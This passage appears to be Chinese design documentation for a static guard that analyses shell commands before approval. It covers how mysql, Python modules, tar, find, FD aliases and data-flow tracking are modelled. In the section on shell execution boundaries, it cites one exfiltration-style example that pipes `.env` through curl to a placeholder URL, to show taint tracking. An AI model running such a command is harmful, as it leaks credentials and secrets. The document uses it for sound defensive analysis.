SQL、初始化 SQL、stdin／交互客户端输入声明不透明数据库操作，复用既有数据库护栏。
`SELECT`、safe-updates、binary-mode、关闭客户端命令都不构成整个调用安全的证明。
`mysql_cli` 只是 SQL／本地客户端命令混合协议的语言元数据，不增加 SQL 解释器，
也不把协议当作 Bash 解析；外层 Bash 替换和重定向继续独立检查。

显式配置、TLS／插件路径、tee 输出与 host／socket 端点保留独立事实。
数据库名是普通值，不冒充文件路径；localhost／工作区 socket 不证明数据库所有权。
必选参数遵循原生归属，包括形似选项的值。长选项的可选值只取 `--option=value`，
不吞后续词。路径投影保留解码后的语义路径和带引号的原参数。

配置加载早于 help／version 处理；`--tee` 在参数解析期间就打开追加目标，早于最终
批处理模式抑制，因此 batch／help 或后续关闭选项不抹掉这一潜在写入。
当前不重放原生 callback 的精确顺序。仅原始语义 argv 前两项为
`--no-defaults --no-login-paths`、没有其他声明 modifier／位置数据的纯信息调用
省去不透明启动审批；前缀未证明、混合、未知或畸形调用仍审批。
白名单完整性回归要求今后每个新 modifier 都明确审查信息准入，不能自动绕过。
裸 `-p` 不吞后续数据库；`-pVALUE`／`--password=VALUE` 正确绑定为可选附着／内联值，
不成为安全豁免。这是有界 CLI 契约，不声称覆盖完整客户端。

两项通用 DSL 加法表达这些契约，没有命令名特例。
`operand_mode: optional_inline_or_short_attached` 只取长选项内联／短选项附着值，
裸选项不吞下一项；cardinality、约束、选项范围和残留审计继续有效。
`{kind: has_argument_at_matching, index: 0, matcher: {kind: literal, value: --no-defaults}}`
按原始 tool argv 从零开始的位置匹配已知语义值：不包含可执行名，但包含子命令、
选项、操作数和终止符；消费参数及 remaining selector 不改变索引。
只投影声明引用的位置，不重写 argv／原始元数据。字面引号会解码，已物化 runtime
数据不再次展开；空字面词是数据，缺失／未知不匹配。
与其他布尔 matcher 一样，否定“不匹配”不证明参数缺失；安全准入应使用正向已知值
谓词。直接 shape API 可用 `with_argument_at` 提供已知索引值。

可能的交互历史保留 `MYSQL_HISTFILE` 或 `~/.mysql_history`，其派生临时输出保持未知，
不编造路径；batch、quick、内联执行形式不加入这一潜在历史写入。
不动态读取配置内容、TTY、文件系统、进程或数据库状态；没有新增风险 Pass、默认策略、
依赖或 Harness 字段。
依据：[客户端选项](https://dev.mysql.com/doc/refman/8.4/en/mysql-command-options.html)、
[客户端命令](https://dev.mysql.com/doc/refman/8.4/en/mysql-commands.html)、
[固定版本客户端实现](https://github.com/mysql/mysql-server/blob/3f821bcb4ee93cd90c0ffa0f8e17bb9677502acf/client/mysql.cc)。

## Python 模块入口

Profile 用 `identity.module_entrypoints: [{runtime: python, name: json.tool}]`
单独声明模块入口，`module_only: true` 表示不注册同名可执行文件。
解释器分派目标声明 `module_runtime: python`，只展开明确登记的模块，
不会回退到同名命令、可执行文件 basename 或命令族别名。两套可执行文件
查找接口都排除模块专属 Profile。派生节点是语义建模单元，不代表创建了
OS 子进程；父层模块加载与模块 CLI 的效果同时保留。未登记或动态模块
沿用已有代码加载策略；已登记模块的未知 argv 仍保留真正的分析缺口。

可选 modifier 声明 `ends_option_scope: true` 在该选项及其操作数之后结束
选项归属范围，要求使用 `leading_options` 或 `permuted_options`；未声明时
旧行为不变。Python 的 `-m`、`-c` 和退出式信息选项使用该能力，后续
模块／脚本 argv 中的 `-m`、`-c`、`-i`、`--help` 不再冒充解释器选项。
扩展 `-X` 配置、交互 `-i` 和不支持的解释器形式按既有不透明操作规则审批。

目前登记 pip、pytest、uvicorn、json.tool、http.server、py_compile、compileall。JSON 文件／stdin
输入和文件／stdout 输出保留数据流，outfile `-` 是字面文件名。
HTTP 服务记录监听、服务目录和 TLS 文件读取；`--directory` 不改变 cwd。
复用已有监听规则，仅数字回环地址豁免，CGI 保持不透明审批。
不探测模块搜索／遮蔽，不分析 Python 本体、请求内容或进程寿命，也不声称
已追踪“服务启动后移动敏感文件”的发布链。

可选声明 `dispatch.unset_environment_when: [{modifier: ignore, names: [CACHE_VAR]}]`
只在所指 modifier 生效时，从派生环境移除列出的固定变量；不清空其他变量、
不修改父环境、不读取宿主机环境。Python `-E/-I` 对已建模的
`PYTHONPYCACHEPREFIX` 使用它；应用自己的环境变量仍生效。

`write_path` 的配置目标可声明 `fallback_parent_slots: [inputs]`：只有参数、
配置环境和默认值来源均确认未设置时，才将输出文件族限定在规范化输入的父目录下。
未知配置不回退；使用现有语义值，保留引号和已物化 argv，未知／缺失输入保留未知写入。
不猜具体字节码标签／临时文件名，不探测文件类型或按后缀分类。文件和目录共用保守的
父目录边界，因此 compileall 输入直接命名工作区根目录时可能需要审批。

两个编译模块读取源码、写字节码，不执行源码本体。已知缓存前缀将写入目标定在该目录；
完整环境下的缺失或已知空前缀才启用输入父目录回退。解释器 `-B` 不取消显式编译写入。
compileall `-b` 使用旧式 sibling 输出且忽略缓存前缀；`-d/-s/-p` 只改嵌入的 traceback
文件名，不是物理输出目录。stdin 文件名列表、文件列表和默认 `sys.path` 扫描的写入范围
未知，除非已知前缀能限定输出。重复 `-i` 保持不透明，不猜最后列表归属。
CLI 契约面向现代 CPython，不声称探测了解释器版本或模块遮蔽。

来源：[CPython CLI](https://docs.python.org/3.14/using/cmdline.html)、
[JSON CLI 源码](https://github.com/python/cpython/blob/v3.14.0/Lib/json/tool.py)、
[HTTP CLI 源码](https://github.com/python/cpython/blob/v3.14.0/Lib/http/server.py)、
[py_compile 源码](https://github.com/python/cpython/blob/v3.14.0/Lib/py_compile.py)、
[compileall 源码](https://github.com/python/cpython/blob/v3.14.0/Lib/compileall.py)。

## 工具内部解释的命令字符串

Profile 可显式声明解释方式，共享分派层不添加可执行名特例：

```yaml
kind: dispatch
command_string: {slot: callback, syntax: posix_shell}
unknown_environment_names: [TOOL_FILENAME]
stdin_from_tool: true
```

`posix_shell` 生成 `/bin/sh -c`，将解码后的操作数保留为一个 argv，复用既有有界嵌套
Shell 分析。`gnu_wordsplit` 则按 GNU wordsplit 默认引号与 C 转义产生 argv，不把
操作符、通配符或命令替换当作 Shell 执行。工具环境变量展开保留未解析子调用，不能把
`$VAR` 原样当实际参数，也不能借用调用者 Shell 的值。畸形引号、NUL／非 ASCII 字节
转义、超过 64 KiB 的字符串及超过 4096 个词的 argv 同样保留缺口。没有执行或环境探测。

每个字符串有独立分派索引。父调用 bound operand 保留原文、来源 span 和语义投影；
子 argv 使用互不重叠的合成坐标，避免依赖 span 的 Shell payload 归属将 `-c` 和参数
混为一项。解码参数是 runtime data，不再按调用者语法展开。`argv_suffix` 在子参数后
追加固定 argv 数据，例如解压程序的 `-d`；字符串来源不能同时声明 `argv`／`argv_prefix`。

`unknown_environment_names` 仅在子环境遮蔽工具生成的同名值，保留无关 exported
变量，不修改父 Shell。`stdin_from_tool` 表达内容未知的工具输出，与
`stdin_from_parent` 互斥。内层 Shell 继承输入存在性，但不得用调用者的字面管道填充
工具内部流；解释器执行未知输入仍走既有运行时输入护栏。

GNU tar 1.35 源码中的创建压缩 `-I`、checkpoint exec 和 `--to-command` 使用
`/bin/sh -c`；解压入口使用 GNU wordsplit 并追加 `-d`。Profile 分别声明，不混用。
checkpoint 的 `exec=` 通过结构化投影提取；echo action 不是程序，help／version
不执行延后的回调。原先按 tar 名字扫描 token 的专用路径移除，不保留双轨分析。
远程 helper、完整旧式选项参数个数、隐式压缩配置及归档成员内容仍为独立限制，
不冒充已覆盖。没有新增风险 Pass、动态探测、Harness 字段或动作策略。

来源：[GNU tar 外部命令](https://www.gnu.org/software/tar/manual/html_section/external.html)、
[GNU tar 1.35 执行源码](https://sources.debian.org/src/tar/1.35%2Bdfsg-3.1/src/system.c/)、
[GNU wordsplit 源码](https://sources.debian.org/src/tar/1.35%2Bdfsg-3.1/lib/wordsplit.c/)。

## 有界子命令 argv 的参数归属

根级 Profile 可选择声明精确匹配的子命令参数区域：

```yaml
option_matching: exact_names
opaque_on_unresolved: true
argument_regions:
  - id: exec
    start_flags: ["-exec"]
    terminators:
      - {value: ";"}
      - {value: "+", preceding: "{}"}
```

`argument_region_command` 绑定该区域的首个命令词，`argument_region_args` 绑定其余
argv；重复区域保留独立索引范围。原始参数文本、引号、span 和物化来源不被改写。
该声明解决参数归属，不新建执行语法或风险规则；工具生成的参数／目标域仍由既有
工具适配处理。

共享扫描器让外层 modifier、selector 和位置参数绑定跳过子 argv 及结束符，区域结束
后继续扫描真正的外层选项。普通选项的参数个数来自既有参数声明，所以 `-name -exec`
中的 `-exec` 是操作数，不是新区域。结束符比较解码后的 argv，而非原始引号；
可选 `preceding` 条件让普通 `+` 保持子参数，只有前一词是 `{}` 才结束该批处理区域。

未知词保留已知部分的子调用／副作用，并添加“参数归属未确定”的 residual；未加引号
的未知选项操作数可能改变实际 argv 个数，也保留不确定性。缺少命令／结束符或外层
选项的参数个数未声明时，产生 selection gap。此能力要求显式开启
`opaque_on_unresolved`，由既有 ResolvePolicy 审批兜底。目前仅支持根级
`all_arguments`／`exact_names`、无 subcommand tree 的组合；不支持的声明组合和
悬空引用在加载时拒绝。未声明区域的 Profile 保持原来的扫描与绑定行为。

find 适配器使用同一份区域范围，不再独立遍历原始 argv 寻找 `-exec`。多个 action
保留各自子调用；子参数中的 `-L`、`-type`、`-name`、`--`、`-delete` 不改变外层
搜索域和副作用。未知根路径、修改目标和 Shell payload 仍进入各自原有护栏。
Shell 的裸 `;` 不属于 find 的 argv；应以 `\;` 或 `';'` 传入结束符。
这不是完整 find 表达式求值器，没有动态探测、新增 Pass 或修改风险动作映射。

## 标准流设备路径与内容读写

Profile 可在 `read_path`／`write_path` 的显式 slot 效果上声明
`path_access: content_open`，表示打开目标读写内容，而非删除路径、创建链接或原地
替换目录项。声明可选；不合法的效果／目标组合在加载时拒绝。本轮仅审查并声明了
tee 的输出、cat 的文件输入及 tar 的归档文件；tar 成员写入、sed 原地替换等不获得
此解释。

共享 `IoTargetQuery` 查询静态投影的 FD 快照。只有内容读写及 Shell 原生文件重定向
才能识别 `/dev/stdin`、`/dev/stdout`、`/dev/stderr`、`/dev/fd/N`、
`/proc/self/fd/N`；其他 `/dev/*` 和其他进程的 `/proc/PID/fd/*` 不属于白名单。
快照按本调用的重定向顺序处理复制、移动、关闭和文件打开，并保留进程替换通道。
`|&` 的 stderr 复制在显式重定向之后生效。重定向操作数使用打开
之前的快照；工具操作数使用所有重定向完成后的快照。打开设备别名不是简单复制
FD：原来的内容写入／打开效果保留，不抹掉创建、截断或追加的可能性。

普通继承的标准流不因别名位于工作区外而触发修改审批；已知文件目标继续使用
既有工作区边界规则；未知非标准 FD 写入要求审批。`/dev/null` 只对内容读写作为
空源／丢弃汇解释，删除、移动、修改权限、链接和路径替换仍检查路径本身。
未知读取不会单独升级为审批；执行未知输入仍使用已有执行护栏。

Graph 中已知文件使用实际 backing path，管道使用同一份 pipeline／transform
工件；普通继承或未知描述符使用显式 `descriptor_stream` 工件和 consume／produce
边。流不因无需工作区外审批而消失，敏感来源仍可经显式 FD 读取、工作区内中间
文件及后续请求到达泄露护栏。无相关目标时不创建 FD 快照；不增加风险 Pass、
Harness 输入、动态 FD 探测或跨 shell action 的实时描述符表。

## 流契约与输出数据依赖

Shell 的 FD 连接不等于工具实际读取数据；读取某份数据也不代表每路输出都包含它。
匹配的 Form 可通过 `stream_contract` 声明隐式 stdin 的使用方式及各路输出依赖：

```yaml
stream_contract:
  stdin_mode: ignored
  stdout_mode: opaque
  stderr_mode: opaque
  stdout_dependency: independent
  stderr_dependency: unknown
```

`stdout_dependency`、`stderr_dependency` 均可为 `inputs`、`independent` 或 `unknown`，省略时为 `unknown`。
`independent` 只适用于不承载输入数据的固定／空输出；不是内容清洗或安全标签。
`opaque` 仅表示输出结构不透明，不改变数据依赖。解析不完整或操作语义未解析时，不采用负向保证。
选中的契约保留在绑定结果中，共享流投影和 `DataDependencyQuery` 消费它，不按命令名分支。

例如 `gzip .env` 仍读取 `.env`、写入 `.env.gz`，并可能删除原文件；其 stdout 不承载文件内容。
`gzip -t` 的 stdout 为空，而 `gzip -l` 的列表信息仍依赖输入。真实文件输出保留来源关系。
管道、重定向、命令／进程替换及分派流使用同样的输出边界，并按重定向顺序纳入 stderr 合并。
显式读取 `/dev/stdin` 或其他 FD 别名仍是实际 ReadPath，不受“忽略隐式 stdin”抹除。
Shell 打开、截断和追加输出文件的路径副作用始终保留；输入 FD 的打开事实不冒充工具消费内容。
结构性 `FlowsTo`／`Dispatches` 不作为泄露证明；未知流契约继续保留保守依赖。
输出依赖随 Graph 快照保存，公共污点查询及已有护栏遵循同一边界。未声明父命令输出关系时，
不能仅凭子调用的独立输出推断父命令全部输出独立。

## 已解析 Shell 执行边界的输入输出

完整解析的 Shell 命令字符串、递归 Shell 脚本和展开后的函数，将实际子调用的
输出生产关系连接到父调用已有的输出工件。不把控制边当内容边，也不把所有子调用
读取都混进父调用输入。因此 `sh -c 'cat .env' | curl --data-binary @- URL` 保留
子调用的敏感来源，而 `sh -c 'cat .env >/dev/null; printf SAFE'` 不凭空污染 stdout。
纳入所有真正逃逸出边界的命令，而非只看最后一条；内部管道、stdout／stderr 路由、
有序 FD 复制、外层重定向和命令／进程替换捕获保留各自边界。

只有解析完整、子调用已入图的范围才用精确子输出替代父调用的粗略输出依赖。
部分解析或展开超限仍保留未知依赖，由既有解析／展开策略审批。脚本文件、可执行
stdin 和物化命令字符串的程序字节来源在解析后仍是子调用输入。继承 stdin 只连接到
实际消费它的子调用；忽略 stdin、本地重定向和内部管道不自动混入父层输入。

对引用到的非标准入口 FD，可复用静态已知父 Shell 帧中的具体文件、关闭或丢弃目标，
再按顺序处理本地 FD 更新。复制保留当时的来源，不受原 FD 后续重绑定污染。
尚无法确定的入口流别名仍为未知，并保留可能输入的保守依赖；这不是实时 FD 表，
也不声称命令一定执行成功。投影由已有输出来源 Pass 完成；没有管道和相关派生执行
边界时开头退出。不增加命令名特例、风险 Pass、宿主机探测或 Harness 输入字段。
执行来源追踪区分分派者的启动上下文与子调用返回的数据：返回的 stdout 仍参与普通
数据来源追踪，但不能沿分派控制边绕回来，充当同一子调用的启动代码。未解析调用
不证明父输出独立。嵌套 Shell 内声明的函数仍有单独的函数体展开缺口，不能靠补
输入输出边就宣称覆盖。

## 进一步阅读

- [工作原理总览](how-it-works.zh-CN.md)
- [安全模型：风险分析、决策和执行边界](security-model.zh-CN.md)
- [配置说明](configuration.zh-CN.md)
